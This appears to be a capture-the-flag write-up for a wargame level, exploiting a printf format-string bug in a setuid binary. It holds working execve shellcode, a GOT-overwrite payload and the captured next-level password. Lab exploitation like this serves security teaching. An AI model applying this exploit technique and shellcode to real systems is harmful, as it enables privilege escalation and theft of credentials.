```shell
$> ls -la
[...]
-rwsr-s---+ 1 level06 users   5176 Sep 10  2016 level05
[...]

$> ./level05 
blabla
blabla
```

Analyze with ghidra and disassembler the code in GDB

```c
[...]
    fgets(buff, 100, stdin);
[...]
    if (buff[i] > 0x42 && buff[i] < 0x5a ) buff[i] ^= 0x20;
[...]
    print(buff);
    exit(0);
[...]

// a fgets stock the input in buff
// a xor is applied to buff, A -> a
// a printf format string vulnerability is present
// a exit is called following printf
// no shell execute here, so we need to use format string vulnerability to leak exit address
// and insert our shellcode in the stack (we will stock in env because xor case will modify our shellcode)
```

```shell
$> gdb -q level05
(gdb) set disassembly-flavor intel
(gdb) disas main
    [...]
    0x080484bb <+119>:   xor    edx,0x20
    [...]
    0x08048504 <+192>:   mov    DWORD PTR [esp],eax
    0x08048507 <+195>:   call   0x8048340 <printf@plt>
    0x0804850c <+200>:   mov    DWORD PTR [esp],0x0
    0x08048513 <+207>:   call   0x8048370 <exit@plt>
    [...]

# xor 0x20 is applied to buff
# printf is called with buff as argument
# exit is called following printf

(gdb) disas 0x8048370
    [...]
    0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
    [...]

# exit is a jump to a pointer (0x80497e0) in .got.plt

$> python -c "print 'aaaa' + '%p ' * 100" | ./level05 
aaaa0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd714 0xf7fdb000 0x61616161
[...]

# offset is at 10th position

$> export SHELLCODE=$(python -c "print '\x90' * 100 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'")

# insert our shellcode in env

$> gdb -q level05
(gdb) b main
[...]

(gdb) r
[...]

(gdb) x /200s environ
[...]
0xffffd816:      "SHELLCODE=[...]"
[...]

# to know where stock our shellcode
# move some bytes to sure that we can get our shellcode
# 0xffffd816 + 50 = 0xffffd848
# (in linux (42): 0xffffd864 + 50 = 0xffffd896)
# we need use padding of format string but 0xffffd816 is too long to stock in 4 bytes (int)
# so we need split our address in 2 parts
# ffff (65535) and d848 (55368)
```

```shell
$> (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55360d%10\$hn' + '%10167d%11\$hn'"; cat) | ./level05

# 55360: 55368 - 8 = 55360 (2 parts shell code address, 2 * 4)
# 10167: 0xffff - 0xd848 = 10167 (1st part = 55468 = d848 and 2nd part = 55468 + 10167 = 0xffff)

# if use linux (42)
# $> (python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55438d%10\$hn' + '%10089d%11\$hn'"; cat) | ./level05

[...]
-134415680
whoami
level06
cat /home/users/level06/.pass  
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```